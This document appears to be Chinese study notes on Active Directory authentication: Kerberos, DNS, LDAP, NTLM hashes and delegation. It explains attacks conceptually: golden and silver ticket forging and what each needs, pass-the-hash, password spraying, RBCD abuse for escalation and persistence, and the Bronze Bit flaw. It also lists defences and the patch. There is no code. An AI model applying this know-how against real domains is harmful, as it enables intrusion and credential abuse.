Active Directory 协议理论

Kerberos协议：

Kerberos 协议使用端口 88（TCP 和 UDP）。在枚举 Active Directory 环境时，我们通常可以通过使用 Nmap 等工具执行端口扫描来查找开放端口 88 来定位域控制器。

kerberos认证：

AS-REQ:

客户端向域控发送一个包含了客户端的用户名，主机名，加密类型，用用户ntml哈希加密的时间戳给DC。

AS-REP:

DC他不会验证你是不是在域内。只会通过AD活动目录去查询客户端的哈希值，然后用哈希去解密客户端的请求包。解密成功验证时间戳(通常为五分钟之内)成功即密码是正确的。（校验时间戳主要为了防止重放攻击。）认证成功就会返回包含krbtgt用户NTML哈希加密后的TGT认购权证和用户哈希加密的login session key、时间戳、PAC中包含用户的SID、用户所在组等一些信息。（该login sessin key主要为了确保下次认证安全）以及其他一些信息。（黄金票据便是在这里产生）

TGS-REQ:

客户端收到域控的返回包，用自己哈希去解密获得login session key 用以生成认证因素，还有DC发的TGT票据认购凭证（客户端会将这俩东西缓存到内存中），客户端会凭借TGT票据去向域控购买响应的ST服务票据。

ST服务是通过DC的另一个TGS服务出售的，在这个阶段，微软引入了两个扩展自协议s4uself和s4u2proxy(当委派的时候，才用得到)如果客户端需要访问某个服务便会凭借TGT认购凭证去向DC上的TGS购买入场卷。

于是客户端向DC的TGS申请请求某个服务器的请求包，请求包包含客户端信息，认证因素，TGT认购凭证，要访问的服务器名称和一些其他信息。

TGS-REP:

DC上的TGS会检查这个服务器存在不存在，如果存在的话就从活动AD中取出krbtgt用户的ntml哈希去解密TGT，检查TGT的原始地址是不是客户端，时间戳是否过期。然后用login session key解密客户端认证因素。匹对时间戳、随机数，如果认证通过，就会用login session key 加密用于确保客户端和服务器之间通信安全的 server session key。然后为客户端生成一个用要访问的服务账号NTML哈希加密的ST服务票据（包含server session key）发送给客户端。（白银票据便是在这里产生）

客户端收到返回包通过log session key解密获取server session key，再拿到ST服务票据，这时候server session key和服务器票据都会缓存在客户端内存。然后客户端用server session key 生成认证因素和ST票据去请求服务器。

PAC:

服务器拿自己ntml哈希去解密自己的票据后获取server session key ，然后用server session key去解密客户端认证因素去匹对时间戳，随机数。 如果都没问题，会向DC去发起一个请求看该客户端是不是在活动目录里，它的访问权限，能不能访问我，就是验证客户端的SID认证权限，如果在的话DC会返回给服务器一个在。服务器就会把结果返回给客户端。

kerberos的缺陷：

域用户枚举：

域控校验用户名存在不存在返回的数据包不一样，可枚举域用户名。

密码喷洒：

域用户密码正确和错误返回的数据包也不一样，可暴力破解密码喷洒。

黄金票据：

在第一次客户端向域控请求时，域控认证通过后返回TGT是用krbtgt用户哈希加密的，所以我们如果有krbtgt用户的哈希，完全可以自己生成TGT认证票据。这就是黄金票据。

伪造黄金票据的前提，我们要有域用户（一般是域管理）域名：域SID(就是域成员SID前面部分) ：krbtgt账号的ntml哈希值或AES-256哈希值

白银票据：

在向TGS请求入场卷返回的ST服务器票据，如果我们有服务器的ntml哈希，就可以自己伪造生成ST服务器票据，我们想啥时候访问啥时候访问。不过它只针对特定服务。如果TGS在生成ST票据是加上 krbtgt用户的签名，而服务器又要去认证该签名，白银票据就会没啥用。

伪造白银票据的前提，我们要有域用户、域名、域SID、服务器的NTML哈希

hash传递（PTH）：

是指攻击者可以通过捕获密码的hash值(对应着密码的值)，然后简单地将其传递来进行身份验证，以此来横向访问其他网络系统。

域外用户枚举：

如果不在域内，域控校验用户名存在不存在返回的数据包不一样，可枚举域用户名。

密码喷洒攻击：

域用户密码正确和错误返回的数据包也不一样，可暴力破解密码喷洒。

黄金票据：

可以肆意的向域控TGS购买访问服务器的凭证。

SPN枚举:

服务器所运行服务的唯一标识，只要是在kerberos协议内的服务，都会具有一个唯一标识像身份证号码一样。

所以我们可通过SPN枚举域内有哪些服务。针对服务我们可以通过pth或别的方式登录上去进行下一步的横向移动。

通过白银票据直接发送给服务器去访问指定服务，来进行攻击，此过程无需KDC。但是伪造的白银票据没有KDC签名，如果服务器开启了KDC签名认证，白银票据是无法使用的。

DNS协议:

Active Directory 域服务 (AD DS) 使用 DNS 允许客户端（工作站、服务器和其他与域通信的系统）定位域控制器，并允许托管目录服务的域控制器在它们之间进行通信。DNS 用于将主机名解析为 IP 地址，并广泛用于内部网络和互联网。专用内部网络使用 Active Directory DNS 命名空间来促进服务器、客户端和对等方之间的通信。

AD 以服务记录 (SRV) 的形式维护在网络上运行的服务数据库。这些服务记录允许 AD 环境中的客户端找到他们需要的服务，例如文件服务器、打印机或域控制器。动态 DNS 用于在系统 IP 地址更改时自动更改 DNS 数据库。手动输入这些条目将非常耗时，并且会留下错误的空间。如果 DNS 数据库没有主机的正确 IP 地址，客户端将无法在网络上找到它并与之通信。

当客户端加入网络时，它通过向 DNS 服务发送查询、从 DNS 数据库中检索 SRV 记录并将域控制器的主机名传输给客户端来定位域控制器。客户端然后使用此主机名来获取域控制器的 IP 地址。

DNS 使用 TCP 和 UDP 端口 53。UDP 端口 53 是默认端口，但当不再能够通信并且 DNS 消息大于 512 字节时，它会回退到 TCP。

LDAP:

Active Directory 支持用于目录查找的轻量级目录访问协议 (LDAP) 。LDAP 是一种开源和跨平台协议，用于针对各种目录服务（例如 AD）进行身份验证。

AD 存储用户帐户信息和密码等安全信息，并有助于与网络上的其他设备共享这些信息。LDAP 是应用程序用来与提供目录服务的其他服务器通信的语言。换句话说，LDAP 是网络环境中的系统可以与 AD “对话”的方式。

LDAP 会话首先连接到 LDAP 服务器，也称为目录系统代理。AD 中的域控制器主动侦听 LDAP 请求，例如安全认证请求。

AD 和 LDAP 的关系可以比作 Apache 和 HTTP。与 Apache 是使用 HTTP 协议的 Web 服务器一样，Active Directory 是使用 LDAP 协议的目录服务器。

虽然不常见，但您可能会在执行没有 AD 但有 LDAP 的评估时遇到组织，这意味着他们很可能使用另一种类型的 LDAP 服务器，例如OpenLDAP。

AD LDAP 身份验证：

LDAP 设置为使用“BIND”操作针对 AD 验证凭据，以设置 LDAP 会话的身份验证状态。有两种类型的 LDAP 身份验证。

  1. Simple Authentication：这包括匿名认证、未经认证的认证和用户名/密码认证。简单身份验证意味着一个username并password创建一个 BIND 请求来向 LDAP 服务器进行身份验证。
  2. SASL Authentication：简单身份验证和安全层 (SASL)框架使用其他身份验证服务（例如 Kerberos）绑定到 LDAP 服务器，然后使用此身份验证服务（本示例中为 Kerberos）对 LDAP 进行身份验证。LDAP 服务器使用 LDAP 协议向授权服务发送 LDAP 消息，授权服务启动一系列质询/响应消息，从而导致身份验证成功或不成功。由于身份验证方法与应用程序协议的分离，SASL 可以提供额外的安全性。

默认情况下，LDAP 身份验证消息以明文形式发送，因此任何人都可以在内部网络上嗅出 LDAP 消息。建议使用 TLS 加密或类似方法来保护传输中的信息。

NTML身份认证：

除了 Kerberos 和 LDAP，Active Directory 还使用其他几种身份验证方法，这些方法可以被 AD 中的应用程序和服务使用（和滥用）。这些包括 LM、NTLM、NTLMv1 和 NTLMv2。这里的 LM 和 NTLM 是哈希名称，NTLMv1 和 NTLMv2 是使用 LM 或 NT 哈希的身份验证协议。下面是这些哈希和协议之间的快速比较，它向我们表明，尽管 Kerberos 无论如何都不是完美的，但它通常是尽可能选择的身份验证协议。了解散列类型和使用它们的协议之间的区别至关重要。

LM:

LAN Manager(LM) 哈希是 Windows 操作系统使用的最古老的密码存储机制。LM 于 1987 年在 OS/2 操作系统上首次亮相。如果正在使用，它们将存储在 Windows 主机上的 SAM 数据库和域控制器上的 NTDS.DIT 数据库中。由于用于 LM 散列的散列算法存在重大安全漏洞，自 Windows Vista/Server 2008 以来它已默认关闭。但是，它仍然很常见，尤其是在仍然使用旧系统的大型环境中。

使用 LM 的密码被限制为最多14字符。密码不区分大小写，并在生成散列值之前转换为大写，将密钥空间限制为总共 69 个字符，使得使用 Hashcat 等工具破解这些散列相对容易。

在散列之前，一个 14 个字符的密码首先被分成两个 7 个字符的块。如果密码少于十四个字符，它将用 NULL 字符填充以达到正确的值。

从每个块创建两个 DES 密钥。然后使用字符串对这些块进行加密，创建两个 8 字节的密文值。然后将这两个值连接在一起，产生一个 LM 哈希。

这种散列算法意味着攻击者只需要两次暴力破解七个字符而不是整个 14 个字符，从而可以在具有一个或多个 GPU 的系统上快速破解 LM 散列。如果密码是七个字符或更少，LM 哈希的后半部分将始终是相同的值，甚至可以在不需要 Hashcat 等工具的情况下直观地确定。使用组策略可以禁止使用 LM 哈希。

NTHash (NTLM)：

NT LAN Manager(NTLM) 哈希用于现代 Windows 系统。它是一种质询-响应认证协议，使用三个消息进行认证：

  1. 客户端首先向服务器发送一个NEGOTIATE_MESSAGE（谈判）。
  2. 服务响应一个CHALLENGE_MESSAGE（质疑），以验证客户端的身份。
  3. 客户端响应一个AUTHENTICATE_MESSAGE（鉴定）。这些哈希值存储在本地 SAM 数据库或域控制器上的 NTDS.DIT 数据库文件中。

尽管它们比 LM 哈希（支持 65,536 个字符的整个 Unicode 字符集）强得多，但它们仍然可以使用 Hashcat 等工具进行离线破解。更长的 NTLM 哈希可能更难破解，甚至长密码（15 个以上字符）也可以使用离线字典攻击结合规则来破解。NTLM 也容易受到 pass-the-hash 攻击，这意味着攻击者可以仅使用 NTLM 哈希（在通过另一次成功攻击获得后）对用户是本地管理员的目标系统进行身份验证，而无需知道明文值的密码。

NTLMv1（网络-NTMLv1）：

NTLM 协议使用 NT 哈希在服务器和客户端之间执行质询/响应。NTLMv1 同时使用 NT 和 LM 哈希，这样可以更容易地在使用Responder等工具或通过NTLM 中继攻击捕获哈希后离线“破解” ，该协议用于网络身份验证，Net-NTLMv1 哈希本身是由质询/响应算法创建的。服务器向客户端发送一个 8 字节的随机数（挑战），客户端返回一个 24 字节的响应。这些哈希不能用于传递哈希攻击。

NTLMv1 是现代 NTLM 身份验证的构建块。与任何协议一样，它也存在缺陷并且容易受到破解和其他攻击。

NTLMv2（网络-NTLMv2）：

是在NTLMv1（网络-NTMLv1）基础上改进的，NTLMv2 协议最初是在 Windows NT 4.0 SP4 中引入的，并被创建为 NTLMv1 的更强大的替代方案。自 Server 2000 以来，它一直是 Windows 中的默认设置。它针对 NTLMv1 容易受到的某些欺骗攻击进行了强化。NTLMv2 向服务器收到的 8 字节质询发送两个响应。这些响应包含质询的 16 字节 HMAC-MD5 哈希、来自客户端的随机生成质询以及用户凭据的 HMAC-MD5 哈希。发送第二个响应，使用可变长度的客户端质询，包括当前时间、8 字节随机值和域名。（像kerberos协议每次客户端加密的时间戳，随机数。）

域缓存凭据 (MSCache2)：

在 AD 环境中，前面提到的身份验证方法要求我们尝试访问的主机与网络的“大脑”域控制器进行通信。Microsoft 开发了MS Cache v1 和 v2算法（也称为Domain Cached Credentials(DCC)）来解决加入域的主机无法与域控制器通信的潜在问题（即，由于网络中断或其他技术问题），NTLM/Kerberos身份验证无法访问有问题的主机。 于是主机在HKEY_LOCAL_MACHINE\SECURITY\Cache注册表项中为任何成功登录到机器的域用户保存最后10个哈希值。但这些哈希并不能用于传递。

委派的分类：

非约束性委派(Unconstrained Delegation):

在Windows Server2000首次发布Active Diretory时，微软提供了一种间的机制来支持用户通过kerberos向web server进行身份验证并需要该用户更新后端数据库服务器上的记录方案。这就是最早的非约束性委派。

对于非约束性委派，服务账号可以获取被委派用户的TGT，并将TGT缓存到本地LSASS进程中，从而服务账号可以使用该TGT，模拟该用户访问该用户能够访问的任意服务。

非约束委派的设置需要SeEnableDelegation特权，该特权通常仅授予域管理员。

非约束性委派有两种情况：

一种是机器账号的非约束性委派，它的userAccountControl属性有个Flag位WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION，其对应的数是0X81000=528384。

一种是配置了非约束性委派属性的服务账号，userAccountControl属性有个Flag位NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION,其对应的数是0x80200=524800。

非约束委派攻击：

非约束委派攻击可以利用服务账号与主机账号，因为只有服务账号和主机账号具有委派属性，域用户账号注册SPN之后就成为了服务账号，主机账号的话可以手动去创建。

约束性委派(Constrained Delegation)：

由于非约束性委派的不安全性，微软在Windows Server 2003中发布了约束性委派。同时，为了在Kerberos协议层面对约束性委派的支持，微软扩展了两个子协议S4u2self(Service for User to Self)和S4u2Proxy(Service for User to Proxy)。对于约束性委派(Constrained Delegation)，服务账号只能获取该用户的ST服务票据，从而只能模拟该用户访问特定的服务。配置了约束性委派账户的msDS-AllowedToDelegateTo属性会指定对哪个SPN进行委派。约束委派的设置需要SeEnableDelegation特权，该特权通常仅授予域管理员。图片来源于(https://shu1l.github.io/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE)

约束性委派与非约束性委派本质上的区别是，非约束性委派的账户能够以用户的TGT请求任何服务。而约束性委派的账户只能以用户的TGT去请求指定的服务。

基于资源的约束性委派(RBCD:Resource Based Constrained Delegation)：

为了使用户/资源更加独立，微软在Windows Server 2012中引入了基于资源的约束性委派。基于资源的约束性委派不需要管理员权限去设置，而是把设置属性的权限赋予了机器自身。基于资源的约束性委派允许资源配置受信任的账户委派给他们，基于资源的约束性委派只能在运行Windows Server 2012 和Windows Server 2012 R2及以上的域控制器上配置，但可以在混合模式林中应用。配置了基于资源的约束性委派账户msDS-AllowedToActOnBehalfOfOtherldentity属性的值被允许委派账号SID，并且委派属性这里没有任何值。

基于资源的约束性委派的优势：
  1. 委派的权限授予给了拥有资源的后端，而不再是前端。
  2. 约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林。
  3. 不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑msDS-AllowedToActOnBehalfOfOtherldentity属性权限，也就是将计算机加入域的域用户和机器自身拥有权限。
约束性委派和基于资源的约束性委派配置的差别：
  • 传统的约束性委派是正向的，通过修改服务账户A的属性msDS-AllowedToDelegateTo，添加服务账户B的SPN，设置约束性委派对象（服务账户B），服务账户A便可模拟用户向域控请求访问服务账户B的ST服务票据。
  • 而基于资源的约束委派则是相反的，通过修改服务账户B的属性msDS-AllowedToActOnBehalfOfOtherldentity添加服务账户A的SID，达到让服务账户A模拟用户访问服务账户B资源的目的。
利用基于资源的约束性委派接管域控或权限提升：

第一种，结合NTLM Relay接管域控，如CVE-2019-1040。

第二种，进行本地提权(获取到了将机器加入域的用户的权限或Account Operators组内的用户权限)

很多企业内部，都会有一个专门将机器加入域的账号，如果能够拿到该账号的权限，则能拿到通过该账号加入域所有机器的system权限。

如果拿到Account Operators组内用户权限的话，则可以拿到除域控外所有机器的system权限。

利用基于资源的约束委派打造变种的黄金票据(权限维持)：

如果假设服务B为krbtgt，服务A为我所控制的一个账号，配置服务A到服务B基于资源的约束性委派，那么我控制的账户就可以获取KDC(Key Distribution Centre) 服务的ST服务票据(也就是TGT认购权证)。我就可以伪造任何权限用户的TGT认购权证，来打造一个变种的黄金票据了。

域委派的防御措施：

高权限的用户，设置为不能被委派。

主机账号需设置委派时，只能设置为约束性委派；

Windows 2012 R2及更高的系统建立了受保护的用户组Protected Users，组内用户不允许被委派，这是有效的手段，受保护的用户组。

但是以上都可以被绕过，绕过漏洞Kerberos Bronze Bit(CVE-2020-17049).

Kerberos Bronze Bit(CVE-2020-17049):

漏洞原理是因为TGS-REP阶段通过S4u2Self协议请求的ST服务票据是使用当前服务账户hash加密的，并且Forwardable标志位不在被微软签名防护的PAC中，而我又知道当前服务账户的hash，因此我可以将ST票据解密，将Forwardable标志位改为1再进行加密生成ST服务票据，这一步是不需要纂改微软PAC签名的，并且KDC验证PAC签名时候也无法察觉到数据包被篡改。这是一个逻辑错误。

漏洞预防和修复：

微软已经发布了该漏洞的补丁程序。补丁编号为KB4598347。可以直接通过自动更新获取。

修复原理：

微软在补丁包中新增了一个票据签名。S4U2Self阶段生成的服务票据，KDC用其密钥在票据上进行了签名，并将签名插入了PAC中，而后PAC又经过两次签名(使用服务密钥(pac_server_checksum)和使用KDC密钥(PAC_PRIVSVR_CHECKSUM签名))。在之后的S4U2Proxy阶段，KDC会验证PAC的三个签名，必须得三个签名都验证通过，KDC才会返回服务票据，否则，KDC将返回KRB_AP_ERR_MODIFIEDX消息。
